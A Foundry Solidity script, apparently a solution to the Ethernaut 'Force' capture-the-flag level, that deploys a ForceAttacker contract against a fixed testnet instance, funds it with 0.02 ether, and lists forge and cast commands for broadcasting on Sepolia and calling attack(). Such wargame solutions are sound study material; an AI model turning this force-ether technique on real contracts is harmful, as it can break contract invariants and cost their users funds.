// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "./Force.sol";
import {ForceAttacker} from "./ForceAttacker.sol";

contract ForceScript is Script {
    address _instance = 0xd0092CCd256378641c0562D4e3B044C62B55a478;
    ForceAttacker public forceAttacker;

    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast();

        forceAttacker = new ForceAttacker(_instance);

        (bool sent, ) = address(forceAttacker).call{value: 0.02 ether}("");
        require(sent, "Failed to send Ether to ForceAttacker");

        // forceAttacker.attack();

        vm.stopBroadcast();
    }
}

// forge script Level7/Force.s.sol --broadcast --rpc-url sepolia --account 0xc717879FBc3EA9F770c0927374ed74A998A3E2Ce
//forge script Level7/Force.s.sol 

// cast send 0xAe67DFa468cA270017B4f983d88205241f683E90 "attack()" --rpc-url sepolia --private-key $PRIVATE_KEY